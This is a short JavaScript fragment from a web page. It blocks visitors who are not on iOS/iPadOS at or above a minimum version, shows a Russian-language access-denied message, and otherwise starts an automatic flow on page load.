  const g = hardGateIOS18();
  if (!g.ok) {
    setBtnLocked();
    hideBtn();
    if (UI.title) UI.title.textContent = "Доступ отклонён";
    if (UI.text)  UI.text.innerHTML   = '<span class="err">Отказ в доступе.</span>';
    if (UI.reason) UI.reason.textContent = g.reason;
    if (UI.note) UI.note.textContent = `Только iPhone/iPad с iOS/iPadOS ${MIN_IOS_MAJOR}+ (iPad desktop-mode допустим).`;
    return; // дальше не идём
  }
  setTimeout(() => autoFlow(), 60);
}

if (document.readyState === "complete" || document.readyState === "interactive") {
  startWithGate();
} else {
  document.addEventListener("DOMContentLoaded", startWithGate);
}
